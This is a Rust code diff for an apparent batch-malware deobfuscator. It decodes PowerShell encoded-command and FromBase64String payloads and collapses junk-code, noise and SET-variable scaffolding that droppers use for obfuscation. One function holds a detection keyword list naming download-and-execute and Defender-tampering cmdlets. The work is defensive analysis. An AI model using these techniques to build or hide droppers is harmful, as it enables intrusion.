+        let (line, newline) = match chunk.strip_suffix('\n') {
+            Some(line) => (line, "\n"),
+            None => (chunk, ""),
+        };
+        let cleaned = marker_noise::strip_unicode_marker_islands(line);
+        changed |= cleaned != line;
+        out.push_str(&cleaned);
+        out.push_str(newline);
+    }
+    changed.then_some(out)
+}
+
+fn render_decoded_powershell_encoded_commands(
+    text: &str,
+    env: &crate::env::Environment,
+) -> Option<String> {
+    if !crate::util::contains_ascii_case_insensitive(text, "-enc")
+        && !crate::util::contains_ascii_case_insensitive(text, "/enc")
+        && !crate::util::contains_ascii_case_insensitive(text, "-e")
+        && !crate::util::contains_ascii_case_insensitive(text, "/e")
+    {
+        return None;
+    }
+
+    let ps_aliases = copied_powershell_alias_names(env);
+    if ps_aliases.is_empty() && !crate::util::contains_ascii_case_insensitive(text, "powershell") {
+        return None;
+    }
+
+    let mut out = String::with_capacity(text.len());
+    let mut changed = false;
+    for chunk in text.split_inclusive('\n') {
+        let (line, newline) = split_line_ending(chunk);
+        if let Some(rendered) = render_decoded_powershell_encoded_command_line(line, &ps_aliases) {
+            out.push_str(&rendered);
+            out.push_str(newline);
+            changed = true;
+        } else {
+            out.push_str(chunk);
+        }
+    }
+    changed.then_some(out)
+}
+
+fn copied_powershell_alias_names(
+    env: &crate::env::Environment,
+) -> std::collections::HashSet<String> {
+    let mut aliases = std::collections::HashSet::new();
+    for trait_item in &env.traits {
+        let Trait::WindowsUtilManip { src, dst, .. } = trait_item else {
+            continue;
+        };
+        let Some(src_base) = basename_for_command_alias(src) else {
+            continue;
+        };
+        if !matches!(
+            src_base,
+            s if s.eq_ignore_ascii_case("powershell.exe")
+                || s.eq_ignore_ascii_case("powershell")
+                || s.eq_ignore_ascii_case("pwsh.exe")
+                || s.eq_ignore_ascii_case("pwsh")
+        ) {
+            continue;
+        }
+        let Some(dst_base) = basename_for_command_alias(dst) else {
+            continue;
+        };
+        aliases.insert(dst_base.to_ascii_lowercase());
+        if let Some(stem) = dst_base.strip_suffix(".exe") {
+            aliases.insert(stem.to_ascii_lowercase());
+        }
+    }
+    aliases
+}
+
+fn basename_for_command_alias(path: &str) -> Option<&str> {
+    let trimmed = path.trim().trim_matches(['"', '\'']);
+    let base = trimmed.rsplit(['\\', '/']).next()?.trim();
+    (!base.is_empty()).then_some(base)
+}
+
+fn summarize_powershell_frombase64_command_lines(
+    text: &str,
+    env: &mut Environment,
+) -> Option<String> {
+    if !crate::util::contains_ascii_case_insensitive(text, "powershell")
+        || !crate::util::contains_ascii_case_insensitive(text, "frombase64string")
+    {
+        return None;
+    }
+
+    let mut out = String::with_capacity(text.len());
+    let mut changed = false;
+    for chunk in text.split_inclusive('\n') {
+        let (line, newline) = split_line_ending(chunk);
+        if let Some(summary) = summarize_powershell_frombase64_command_line(line, env) {
+            out.push_str(&summary);
+            out.push_str(newline);
+            changed = true;
+        } else {
+            out.push_str(chunk);
+        }
+    }
+    changed.then_some(out)
+}
+
+fn summarize_powershell_frombase64_command_line(
+    line: &str,
+    env: &mut Environment,
+) -> Option<String> {
+    if !crate::util::contains_ascii_case_insensitive(line, "powershell")
+        || !crate::util::contains_ascii_case_insensitive(line, "frombase64string")
+    {
+        return None;
+    }
+
+    let (encoded_len, decoded_len) = decoded_powershell_frombase64_literal_sizes(line)?;
+    env.traits.push(crate::traits::Trait::LineTruncated {
+        original_len: line.len() as u64,
+    });
+    Some(format!(
+        "rem omitted PS FromBase64String command line ({} bytes; encoded payload {} bytes; decoded PS payload {} bytes)",
+        line.len(),
+        encoded_len,
+        decoded_len
+    ))
+}
+
+fn decoded_powershell_frombase64_literal_sizes(line: &str) -> Option<(usize, usize)> {
+    use base64::Engine as _;
+    use once_cell::sync::Lazy;
+
+    #[expect(clippy::expect_used, reason = "static regex construction")]
+    static FROMBASE64_LITERAL_RE: Lazy<regex::Regex> = Lazy::new(|| {
+        regex::Regex::new(r#"(?i)FromBase64String\s*\(\s*["']([A-Za-z0-9+/=]{40,})["']\s*\)"#)
+            .expect("frombase64 literal regex")
+    });
+
+    for caps in FROMBASE64_LITERAL_RE.captures_iter(line) {
+        let Some(encoded) = caps.get(1).map(|m| m.as_str()) else {
+            continue;
+        };
+        if encoded.len() > 256 * 1024 {
+            continue;
+        }
+        let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(encoded) else {
+            continue;
+        };
+        if decoded.len() > 256 * 1024 {
+            continue;
+        }
+        let rendered = decode_likely_powershell_payload(&decoded);
+        if looks_like_powershell_text(&rendered) {
+            return Some((encoded.len(), decoded.len()));
+        }
+    }
+    None
+}
+
+fn render_decoded_powershell_encoded_command_line(
+    line: &str,
+    ps_aliases: &std::collections::HashSet<String>,
+) -> Option<String> {
+    if !crate::util::contains_ascii_case_insensitive(line, "powershell") && ps_aliases.is_empty() {
+        return None;
+    }
+    let tokens = crate::handlers::util::split_words(line);
+    if tokens.is_empty()
+        || !tokens.iter().any(|token| {
+            let token = crate::handlers::util::strip_outer_quotes(token);
+            token.rsplit(['/', '\\']).next().is_some_and(|name| {
+                let lower = name.to_ascii_lowercase();
+                lower.starts_with("powershell") || ps_aliases.contains(&lower)
+            })
+        })
+    {
+        return None;
+    }
+
+    let mut idx = 0usize;
+    while idx < tokens.len() {
+        let token = crate::handlers::util::strip_outer_quotes(&tokens[idx]);
+        if let Some((flag, value)) = attached_powershell_flag_value(token) {
+            if flag == "EncodedCommand" {
+                return decode_renderable_powershell_encoded_command(value)
+                    .map(render_powershell_command_line);
+            }
+        }
+        if crate::handlers::powershell::canonical_ps_flag(token) == Some("EncodedCommand") {
+            let encoded = collect_encoded_command_argument(&tokens[idx + 1..]);
+            return decode_renderable_powershell_encoded_command(&encoded)
+                .map(render_powershell_command_line);
+        }
+        idx += 1;
+    }
+
+    None
+}
+
+fn attached_powershell_flag_value(token: &str) -> Option<(&'static str, &str)> {
+    let stripped = token
+        .strip_prefix('/')
+        .or_else(|| token.strip_prefix('-'))?;
+    let delimiter = stripped.find([':', '='])?;
+    let flag = crate::handlers::powershell::canonical_ps_flag(
+        &token[..token.len() - stripped.len() + delimiter],
+    )?;
+    let value = &stripped[delimiter + 1..];
+    (!value.is_empty()).then_some((flag, value))
+}
+
+fn collect_encoded_command_argument(tokens: &[String]) -> String {
+    let mut out = String::new();
+    for token in tokens {
+        let token = crate::handlers::util::strip_outer_quotes(token);
+        if token.is_empty() || !token.bytes().all(is_base64_carrier_byte) {
+            break;
+        }
+        out.push_str(token);
+    }
+    out
+}
+
+fn decode_renderable_powershell_encoded_command(encoded: &str) -> Option<String> {
+    const MAX_DECODED_ENCODED_COMMAND_BYTES: usize = 128 * 1024;
+
+    if encoded.len() < 16 || encoded.len() > MAX_DECODED_ENCODED_COMMAND_BYTES * 2 {
+        return None;
+    }
+    use base64::Engine as _;
+    let decoded = base64::engine::general_purpose::STANDARD
+        .decode(encoded)
+        .ok()?;
+    if decoded.len() > MAX_DECODED_ENCODED_COMMAND_BYTES {
+        return None;
+    }
+    let rendered = decode_likely_powershell_payload(&decoded);
+    if !looks_like_powershell_text(&rendered) {
+        return None;
+    }
+    let rendered = escape_rendered_control_chars(&rendered);
+    (!rendered.trim().is_empty()).then_some(rendered)
+}
+
+fn render_powershell_command_line(decoded: String) -> String {
+    let decoded = decoded.trim();
+    let escaped = decoded.replace('"', "`\"");
+    format!("powershell -Command \"{escaped}\"")
+}
+
+fn looks_like_powershell_text(text: &str) -> bool {
+    let lower = text.to_ascii_lowercase();
+    lower.contains("powershell")
+        || lower.contains("-command")
+        || lower.contains("/command")
+        || lower.contains("invoke-expression")
+        || lower.contains("invoke-webrequest")
+        || lower.contains("new-object")
+        || lower.contains("add-mppreference")
+        || lower.contains("set-mppreference")
+        || lower.contains("start-process")
+        || lower.contains("frombase64string")
+        || lower.contains("downloadstring")
+        || lower.contains('$')
+}
+
+fn escape_rendered_control_chars(text: &str) -> String {
+    let mut out = String::with_capacity(text.len());
+    for ch in text.chars() {
+        match ch {
+            '\r' | '\n' | '\t' => out.push(ch),
+            ch if ch.is_control() => {
+                use std::fmt::Write as _;
+                let _ = write!(out, "\\x{:02X}", ch as u32);
+            }
+            ch => out.push(ch),
+        }
+    }
+    out
+}
+
+fn is_very_long_plain_alpha_noise_payload(payload: &str) -> bool {
+    const MIN_PLAIN_ALPHA_NOISE_BYTES: usize = 4 * 1024;
+
+    if payload.len() < MIN_PLAIN_ALPHA_NOISE_BYTES
+        || payload.contains("://")
+        || !payload.bytes().all(|b| b.is_ascii_alphabetic())
+    {
+        return false;
+    }
+    let mut seen = [false; 26];
+    let mut distinct = 0usize;
+    for b in payload.bytes() {
+        let idx = b.to_ascii_lowercase() as usize - b'a' as usize;
+        if !seen[idx] {
+            seen[idx] = true;
+            distinct += 1;
+            if distinct >= 8 {
+                return true;
+            }
+        }
+    }
+    false
+}
+
+fn flush_repetitive_echo_noise_run(
+    out: &mut String,
+    pending: &mut String,
+    pending_payload_bytes: &mut usize,
+    pending_lines: &mut usize,
+    env: &mut Environment,
+) -> bool {
+    if pending.is_empty() {
+        return false;
+    }
+    let changed = *pending_lines >= 3 && *pending_payload_bytes >= 16 * 1024;
+    if changed {
+        rescue_truncated_urls(pending, pending.len(), env);
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: pending.len() as u64,
+        });
+        out.push_str(&format!(
+            "rem omitted {} bytes from {} repetitive echo noise lines\r\n",
+            *pending_payload_bytes, *pending_lines
+        ));
+    } else {
+        out.push_str(pending);
+    }
+    pending.clear();
+    *pending_payload_bytes = 0;
+    *pending_lines = 0;
+    changed
+}
+
+fn repetitive_echo_noise_line_payload_len(line: &str) -> Option<usize> {
+    let trimmed = line.trim_start_matches(['@', ' ', '\t']);
+    let lower = trimmed.get(..5.min(trimmed.len()))?.to_ascii_lowercase();
+    let payload = if lower == "echo " {
+        &trimmed[5..]
+    } else if trimmed
+        .get(..4)
+        .is_some_and(|prefix| prefix.eq_ignore_ascii_case("echo"))
+    {
+        &trimmed[4..]
+    } else {
+        return None;
+    };
+    let payload = payload
+        .split_once('>')
+        .map(|(before_redirect, _)| before_redirect)
+        .unwrap_or(payload)
+        .trim_end();
+    if payload.contains(['<', '|', '&']) {
+        return None;
+    }
+    is_repetitive_echo_noise_payload(payload).then_some(payload.len())
+}
+
+fn is_c_style_junkcode_echo_line(line: &str) -> bool {
+    let trimmed = line.trim_start_matches(['@', ' ', '\t']);
+    if trimmed.len() < 8
+        || !trimmed
+            .get(..4)
+            .is_some_and(|prefix| prefix.eq_ignore_ascii_case("echo"))
+    {
+        return false;
+    }
+    let rest = trimmed[4..].trim_start();
+    if rest.contains("://") {
+        return false;
+    }
+    let lower = rest.to_ascii_lowercase();
+    let payload = lower.trim();
+    is_pjunkcode_assignment(payload.strip_prefix("float ").unwrap_or(payload))
+        || is_pjunkcode_if(payload)
+}
+
+fn is_pjunkcode_assignment(payload: &str) -> bool {
+    let Some(rest) = payload.strip_prefix("pjunkcode") else {
+        return false;
+    };
+    let rest = rest.trim_start();
+    let Some(rest) = rest.strip_prefix('=') else {
+        return false;
+    };
+    let value = rest
+        .trim_start()
+        .strip_suffix(';')
+        .unwrap_or(rest.trim_start());
+    !value.is_empty() && value.bytes().all(|b| b.is_ascii_digit())
+}
+
+fn is_pjunkcode_if(payload: &str) -> bool {
+    let Some(rest) = payload.strip_prefix("if") else {
+        return false;
+    };
+    let rest = rest.trim_start();
+    let Some(rest) = rest.strip_prefix('(') else {
+        return false;
+    };
+    let rest = rest.trim_start();
+    let Some(rest) = rest.strip_prefix("pjunkcode") else {
+        return false;
+    };
+    let rest = rest.trim_start();
+    let Some(rest) = rest.strip_prefix('=') else {
+        return false;
+    };
+    let rest = rest.trim_start();
+    let Some(end) = rest.find(')') else {
+        return false;
+    };
+    let value = rest[..end].trim();
+    let tail = rest[end + 1..].trim();
+    !value.is_empty() && value.bytes().all(|b| b.is_ascii_digit()) && tail == ";"
+}
+
 fn is_alpha_noise_payload(payload: &str) -> bool {
+    if payload.is_ascii() {
+        let mut alpha = 0usize;
+        let mut alnum = 0usize;
+        let mut printable = 0usize;
+        let total = payload.len();
+        for byte in payload.bytes() {
+            if byte.is_ascii_alphabetic() {
+                alpha += 1;
+            }
+            if byte.is_ascii_alphanumeric() {
+                alnum += 1;
+            }
+            if byte.is_ascii_graphic() || byte.is_ascii_whitespace() {
+                printable += 1;
+            }
+        }
+        return total > 0
+            && printable * 100 >= total * 98
+            && (alpha * 100 >= total * 80
+                || (alpha * 100 >= total * 50 && alnum * 100 >= total * 95));
+    }
+
     let mut alpha = 0usize;
+    let mut alnum = 0usize;
     let mut printable = 0usize;
     let mut total = 0usize;
     for ch in payload.chars() {
@@ -10167,11 +15762,162 @@ fn is_alpha_noise_payload(payload: &str) -> bool {
         if ch.is_ascii_alphabetic() {
             alpha += ch.len_utf8();
         }
+        if ch.is_ascii_alphanumeric() {
+            alnum += ch.len_utf8();
+        }
         if ch.is_ascii_graphic() || ch.is_ascii_whitespace() {
             printable += ch.len_utf8();
         }
     }
-    total > 0 && printable * 100 >= total * 98 && alpha * 100 >= total * 80
+    total > 0
+        && printable * 100 >= total * 98
+        && (alpha * 100 >= total * 80 || (alpha * 100 >= total * 50 && alnum * 100 >= total * 95))
+}
+
+fn is_repetitive_echo_noise_payload(payload: &str) -> bool {
+    const MIN_REPETITIVE_BYTES: usize = 4096;
+
+    if payload.len() < MIN_REPETITIVE_BYTES
+        || payload.contains("://")
+        || payload.contains(r"\\")
+        || payload.bytes().all(is_base64_carrier_byte)
+        || payload.bytes().all(|b| b.is_ascii_hexdigit())
+    {
+        return false;
+    }
+
+    let mut total = 0usize;
+    let mut printable = 0usize;
+    let mut counts = std::collections::HashMap::<char, usize>::new();
+    for ch in payload.chars() {
+        total += 1;
+        if ch.is_ascii_graphic() || ch.is_ascii_whitespace() || !ch.is_control() {
+            printable += 1;
+        }
+        *counts.entry(ch).or_insert(0) += 1;
+        if counts.len() > 16 {
+            return false;
+        }
+    }
+    if total == 0 || printable * 100 < total * 98 {
+        return false;
+    }
+    let max_count = counts.values().copied().max().unwrap_or(0);
+    counts.len() <= 4 || max_count * 100 >= total * 90
+}
+
+fn is_auto_alpha_echo_noise_payload(payload: &str) -> bool {
+    let mut alnum = 0usize;
+    let mut alpha = 0usize;
+    let mut digits = 0usize;
+    let mut printable = 0usize;
+    let mut total = 0usize;
+    for ch in payload.chars() {
+        total += ch.len_utf8();
+        if ch.is_ascii_alphanumeric() {
+            alnum += ch.len_utf8();
+        }
+        if ch.is_ascii_alphabetic() {
+            alpha += ch.len_utf8();
+        }
+        if ch.is_ascii_digit() {
+            digits += ch.len_utf8();
+        }
+        if ch.is_ascii_graphic() || ch.is_ascii_whitespace() {
+            printable += ch.len_utf8();
+        }
+    }
+    total > 0
+        && printable * 100 >= total * 98
+        && alnum * 100 >= total * 98
+        && alpha * 100 >= total * 50
+        && digits * 100 >= total * 5
+}
+
+fn is_low_alphabet_alpha_echo_noise_payload(payload: &str) -> bool {
+    const MIN_LOW_ALPHABET_BYTES: usize = 64 * 1024;
+
+    if payload.len() < MIN_LOW_ALPHABET_BYTES {
+        return false;
+    }
+
+    let mut seen = [false; 26];
+    let mut distinct = 0usize;
+    let mut alpha = 0usize;
+    let mut printable = 0usize;
+    let mut total = 0usize;
+    for ch in payload.chars() {
+        total += ch.len_utf8();
+        if ch.is_ascii_alphabetic() {
+            alpha += ch.len_utf8();
+            let idx = ch.to_ascii_lowercase() as usize - 'a' as usize;
+            if !seen[idx] {
+                seen[idx] = true;
+                distinct += 1;
+            }
+        }
+        if ch.is_ascii_graphic() || ch.is_ascii_whitespace() {
+            printable += ch.len_utf8();
+        }
+    }
+
+    total > 0
+        && printable * 100 >= total * 98
+        && alpha * 100 >= total * 98
+        && (4..=16).contains(&distinct)
+}
+
+fn is_repetitive_alpha_echo_noise_payload(payload: &str) -> bool {
+    const MIN_REPETITIVE_BYTES: usize = 64 * 1024;
+    const SAMPLE_BYTES: usize = 8192;
+    const MAX_UNIQUE_4GRAMS: usize = 128;
+
+    if payload.len() < MIN_REPETITIVE_BYTES {
+        return false;
+    }
+
+    let mut alpha = 0usize;
+    let mut printable = 0usize;
+    let mut total = 0usize;
+    let mut seen = [false; 26];
+    let mut distinct = 0usize;
+    for ch in payload.chars() {
+        total += ch.len_utf8();
+        if ch.is_ascii_alphabetic() {
+            alpha += ch.len_utf8();
+            let idx = ch.to_ascii_lowercase() as usize - 'a' as usize;
+            if !seen[idx] {
+                seen[idx] = true;
+                distinct += 1;
+            }
+        }
+        if ch.is_ascii_graphic() || ch.is_ascii_whitespace() {
+            printable += ch.len_utf8();
+        }
+    }
+    if total == 0 || printable * 100 < total * 98 || alpha * 100 < total * 98 || distinct < 4 {
+        return false;
+    }
+
+    let sample = &payload[..payload
+        .char_indices()
+        .map(|(idx, _)| idx)
+        .take_while(|idx| *idx <= SAMPLE_BYTES.min(payload.len()))
+        .last()
+        .unwrap_or(0)];
+    if sample.len() < 512 {
+        return false;
+    }
+
+    let bytes = sample.as_bytes();
+    let mut grams: std::collections::HashSet<[u8; 4]> = std::collections::HashSet::new();
+    for window in bytes.windows(4) {
+        grams.insert([window[0], window[1], window[2], window[3]]);
+        if grams.len() > MAX_UNIQUE_4GRAMS {
+            return false;
+        }
+    }
+    true
 }
 
 fn summarize_base64_pe_carrier_line(line: &str) -> Option<String> {
@@ -10201,7 +15947,7 @@ fn summarize_base64_pe_carrier_line(line: &str) -> Option<String> {
         .saturating_mul(3)
         .saturating_sub(padding);
     Some(format!(
-        "::==== batdeob: omitted base64 PE carrier ({} base64 bytes, ~{} decoded bytes) ====",
+        ":: omitted base64 PE carrier ({} base64 bytes, ~{} decoded bytes)",
         trimmed.len(),
         decoded_estimate
     ))
@@ -10228,7 +15974,10 @@ fn summarize_encoded_set_carrier_line_runs(text: &str, env: &mut Environment) ->
 
     for line in text.split_inclusive('\n') {
         let (body, _) = split_line_ending(line);
-        if is_encoded_set_carrier_line(body) {
+        if is_encoded_set_carrier_line(body)
+            || is_long_base64_set_carrier_line(body)
+            || is_chunked_encoded_set_fragment_line(body)
+        {
             pending.push_str(line);
             pending_lines += 1;
             continue;
@@ -10249,10 +15998,276 @@ fn flush_encoded_set_carrier_run(
     if pending.is_empty() {
         return;
     }
-    if *pending_lines >= 16 && pending.len() >= 16 * 1024 {
+    if (*pending_lines >= 16 && pending.len() >= 16 * 1024) || pending.len() >= 4096 {
         rescue_truncated_urls(pending, pending.len(), env);
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: pending.len() as u64,
+        });
+    } else {
+        out.push_str(pending);
+    }
+    pending.clear();
+    *pending_lines = 0;
+}
+
+fn suppress_short_set_fragment_line_runs(text: &str, env: &mut Environment) -> String {
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut pending = String::new();
+    let mut pending_lines = 0usize;
+
+    for line in text.split_inclusive('\n') {
+        let (body, _) = split_line_ending(line);
+        if is_short_set_fragment_carrier_line(body) {
+            pending.push_str(line);
+            pending_lines += 1;
+            continue;
+        }
+        flush_short_set_fragment_run(&mut out, &mut pending, &mut pending_lines, env);
+        out.push_str(line);
+    }
+    flush_short_set_fragment_run(&mut out, &mut pending, &mut pending_lines, env);
+    out
+}
+
+fn suppress_unreferenced_extracted_short_set_fragments(text: &str, env: &Environment) -> String {
+    if env.all_extracted_ps1.is_empty()
+        && env.all_extracted_jscript.is_empty()
+        && env.all_extracted_vbs.is_empty()
+    {
+        return text.to_string();
+    }
+
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut changed = false;
+    for line in text.split_inclusive('\n') {
+        let (body, _) = split_line_ending(line);
+        if is_unreferenced_extracted_short_set_fragment_line(body, text) {
+            changed = true;
+            continue;
+        }
+        out.push_str(line);
+    }
+
+    if changed {
+        out
+    } else {
+        text.to_string()
+    }
+}
+
+fn is_unreferenced_extracted_short_set_fragment_line(line: &str, text: &str) -> bool {
+    let Some((name, value)) = set_assignment(line) else {
+        return false;
+    };
+    let value = strip_outer_set_quotes(value.trim());
+    if is_common_environment_assignment_name(name)
+        || !name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
+    {
+        return false;
+    }
+    let is_short_alpha_fragment =
+        name.len() >= 24 && value.len() == 1 && value.bytes().all(|b| b.is_ascii_alphanumeric());
+    let is_random_quote_fragment = name.len() >= 16
+        && name.bytes().any(|b| b == b'_')
+        && name.bytes().any(|b| b.is_ascii_digit())
+        && (value.is_empty()
+            || (value.len() <= 3 && value.bytes().all(|b| matches!(b, b' ' | b'"' | b'\''))))
+        && !value.contains("://")
+        && value.bytes().all(|b| b == b' ' || b.is_ascii_graphic());
+    if !is_short_alpha_fragment && !is_random_quote_fragment {
+        return false;
+    }
+
+    let percent_ref = format!("%{name}%");
+    let bang_ref = format!("!{name}!");
+    !contains_ascii_case_insensitive_bytes(text.as_bytes(), percent_ref.as_bytes())
+        && !contains_ascii_case_insensitive_bytes(text.as_bytes(), bang_ref.as_bytes())
+}
+
+fn summarize_unreferenced_long_set_scaffolding_runs(text: &str, env: &mut Environment) -> String {
+    let mut total_scaffold_lines = 0usize;
+    let mut total_scaffold_bytes = 0usize;
+    for line in text.lines() {
+        if is_unreferenced_long_set_scaffolding_line(line, text) {
+            total_scaffold_lines += 1;
+            total_scaffold_bytes += line.len();
+        }
+    }
+    if total_scaffold_lines >= 64 && total_scaffold_bytes >= 2048 {
+        let summarized = summarize_dense_unreferenced_long_set_scaffolding_lines(
+            text,
+            env,
+            total_scaffold_lines,
+        );
+        return summarize_dense_unreferenced_set_scaffolding_lines(&summarized, env);
+    }
+
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut pending = String::new();
+    let mut pending_lines = 0usize;
+
+    for line in text.split_inclusive('\n') {
+        let (body, _) = split_line_ending(line);
+        if is_unreferenced_long_set_scaffolding_line(body, text) {
+            pending.push_str(line);
+            pending_lines += 1;
+            continue;
+        }
+        flush_unreferenced_long_set_scaffolding_run(
+            &mut out,
+            &mut pending,
+            &mut pending_lines,
+            env,
+        );
+        out.push_str(line);
+    }
+    flush_unreferenced_long_set_scaffolding_run(&mut out, &mut pending, &mut pending_lines, env);
+    summarize_dense_unreferenced_set_scaffolding_lines(&out, env)
+}
+
+fn summarize_dense_unreferenced_long_set_scaffolding_lines(
+    text: &str,
+    env: &mut Environment,
+    total_scaffold_lines: usize,
+) -> String {
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut omitted_lines = 0usize;
+    let mut omitted_bytes = 0usize;
+    let mut summary_inserted = false;
+    let mut summary_ending = "\r\n";
+
+    for line in text.split_inclusive('\n') {
+        let (body, ending) = split_line_ending(line);
+        if is_unreferenced_long_set_scaffolding_line(body, text) {
+            if !summary_inserted {
+                out.push_str(&format!(
+                    "rem omitted {} unreferenced long-name set scaffolding lines{}",
+                    total_scaffold_lines, ending
+                ));
+                summary_inserted = true;
+                summary_ending = ending;
+            }
+            rescue_truncated_urls(body, body.len(), env);
+            omitted_lines += 1;
+            omitted_bytes += line.len();
+            continue;
+        }
+        out.push_str(line);
+    }
+
+    if omitted_lines > 0 {
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: omitted_bytes as u64,
+        });
         out.push_str(&format!(
-            "::==== batdeob: omitted {} encoded SET carrier lines ({} bytes) ====\r\n",
+            "rem omitted {omitted_lines} unreferenced long-name set scaffolding lines ({omitted_bytes} bytes){summary_ending}"
+        ));
+    }
+    out
+}
+
+fn flush_unreferenced_long_set_scaffolding_run(
+    out: &mut String,
+    pending: &mut String,
+    pending_lines: &mut usize,
+    env: &mut Environment,
+) {
+    if pending.is_empty() {
+        return;
+    }
+    if *pending_lines >= 64 && pending.len() >= 2048 {
+        let ending = if pending.contains("\r\n") {
+            "\r\n"
+        } else {
+            "\n"
+        };
+        rescue_truncated_urls(pending, pending.len(), env);
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: pending.len() as u64,
+        });
+        out.push_str(&format!(
+            "rem omitted {} unreferenced long-name set scaffolding lines ({} bytes){}",
+            *pending_lines,
+            pending.len(),
+            ending
+        ));
+    } else {
+        out.push_str(pending);
+    }
+    pending.clear();
+    *pending_lines = 0;
+}
+
+fn is_unreferenced_long_set_scaffolding_line(line: &str, text: &str) -> bool {
+    let Some((name, value)) = set_assignment(line) else {
+        return false;
+    };
+    let value = strip_outer_set_quotes(value.trim());
+    if name.len() < 20
+        || name.len() > 96
+        || value.len() > 128
+        || !name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
+        || value.chars().any(|c| c.is_control())
+    {
+        return false;
+    }
+
+    let percent_ref = format!("%{name}%");
+    let bang_ref = format!("!{name}!");
+    !contains_ascii_case_insensitive_bytes(text.as_bytes(), percent_ref.as_bytes())
+        && !contains_ascii_case_insensitive_bytes(text.as_bytes(), bang_ref.as_bytes())
+}
+
+fn summarize_generated_nonascii_set_scaffold_runs(text: &str, env: &mut Environment) -> String {
+    const MIN_RUN: usize = 8;
+
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut pending = String::new();
+    let mut pending_lines = 0usize;
+
+    for line in text.split_inclusive('\n') {
+        let (body, _) = split_line_ending(line);
+        if is_generated_nonascii_set_scaffold_line(body) {
+            pending.push_str(line);
+            pending_lines += 1;
+            continue;
+        }
+        flush_generated_nonascii_set_scaffold_run(
+            &mut out,
+            &mut pending,
+            &mut pending_lines,
+            MIN_RUN,
+            env,
+        );
+        out.push_str(line);
+    }
+    flush_generated_nonascii_set_scaffold_run(
+        &mut out,
+        &mut pending,
+        &mut pending_lines,
+        MIN_RUN,
+        env,
+    );
+    out
+}
+
+fn flush_generated_nonascii_set_scaffold_run(
+    out: &mut String,
+    pending: &mut String,
+    pending_lines: &mut usize,
+    min_run: usize,
+    env: &mut Environment,
+) {
+    if pending.is_empty() {
+        return;
+    }
+    if *pending_lines >= min_run {
+        rescue_truncated_urls(pending, pending.len(), env);
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: pending.len() as u64,
+        });
+        out.push_str(&format!(
+            "rem omitted {} generated non-ASCII set scaffold lines ({} bytes)\r\n",
             *pending_lines,
             pending.len()
         ));
@@ -10261,6 +16276,3822 @@ fn flush_encoded_set_carrier_run(
     }
     pending.clear();
     *pending_lines = 0;
+}
+
+fn is_generated_nonascii_set_scaffold_line(line: &str) -> bool {
+    let trimmed = line.trim_start();
+    let command = trimmed.strip_prefix('@').unwrap_or(trimmed).trim_start();
+    if !crate::util::starts_with_ascii_case_insensitive(command, "set ") {
+        return false;
+    }
+    let rest = command[3..].trim_start();
+    let Some(body) = rest
+        .strip_prefix('"')
+        .and_then(|value| value.strip_suffix('"'))
+    else {
+        return false;
+    };
+    let Some((name, value)) = body.split_once('=') else {
+        return false;
+    };
+    if name.len() < 2 || name.len() > 24 || !name.starts_with('_') {
+        return false;
+    }
+    if !name
+        .chars()
+        .any(|ch| ch == '\u{fffd}' || (ch as u32) >= 0x80)
+    {
+        return false;
+    }
+    if value.len() < 48 || value.len() > 160 || value.contains("://") {
+        return false;
+    }
+    let randomish = value
+        .bytes()
+        .filter(|b| b.is_ascii_alphanumeric() || *b == b'@' || *b == b' ')
+        .count();
+    randomish == value.len()
+        && value.bytes().any(|b| b.is_ascii_uppercase())
+        && value.bytes().any(|b| b.is_ascii_lowercase())
+        && value.bytes().any(|b| b.is_ascii_digit())
+}
+
+fn summarize_dense_unreferenced_set_scaffolding_lines(text: &str, env: &mut Environment) -> String {
+    let mut total_scaffold_lines = 0usize;
+    let mut total_scaffold_bytes = 0usize;
+    for line in text.lines() {
+        if is_unreferenced_dense_set_scaffolding_line(line, text) {
+            total_scaffold_lines += 1;
+            total_scaffold_bytes += line.len();
+        }
+    }
+    if total_scaffold_lines < 48 || total_scaffold_bytes < 1024 {
+        return text.to_string();
+    }
+
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut omitted_lines = 0usize;
+    let mut omitted_bytes = 0usize;
+    let mut summary_inserted = false;
+
+    for line in text.split_inclusive('\n') {
+        let (body, ending) = split_line_ending(line);
+        if is_unreferenced_dense_set_scaffolding_line(body, text) {
+            if !summary_inserted {
+                out.push_str(&format!(
+                    "rem omitted {total_scaffold_lines} unreferenced set scaffolding lines ({total_scaffold_bytes} bytes){ending}"
+                ));
+                summary_inserted = true;
+            }
+            rescue_truncated_urls(body, body.len(), env);
+            omitted_lines += 1;
+            omitted_bytes += line.len();
+            continue;
+        }
+        out.push_str(line);
+    }
+
+    if omitted_lines > 0 {
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: omitted_bytes as u64,
+        });
+    }
+    out
+}
+
+fn is_unreferenced_dense_set_scaffolding_line(line: &str, text: &str) -> bool {
+    if is_unreferenced_dense_set_arithmetic_scaffolding_line(line, text) {
+        return true;
+    }
+
+    let Some((name, value)) = set_assignment(line) else {
+        return false;
+    };
+    if is_common_environment_assignment_name(name) {
+        return false;
+    }
+    let value = strip_outer_set_quotes(value.trim());
+    if name.len() < 4
+        || name.len() > 96
+        || value.is_empty()
+        || value.len() > 160
+        || value.contains("://")
+        || !name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
+        || value.chars().any(|c| c.is_control())
+    {
+        return false;
+    }
+
+    let percent_ref = format!("%{name}%");
+    let bang_ref = format!("!{name}!");
+    !contains_ascii_case_insensitive_bytes(text.as_bytes(), percent_ref.as_bytes())
+        && !contains_ascii_case_insensitive_bytes(text.as_bytes(), bang_ref.as_bytes())
+}
+
+fn is_unreferenced_dense_set_arithmetic_scaffolding_line(line: &str, text: &str) -> bool {
+    let Some((name, value)) = set_arithmetic_assignment(line) else {
+        return false;
+    };
+    let value = strip_outer_set_quotes(value.trim());
+    if name.len() < 2
+        || name.len() > 16
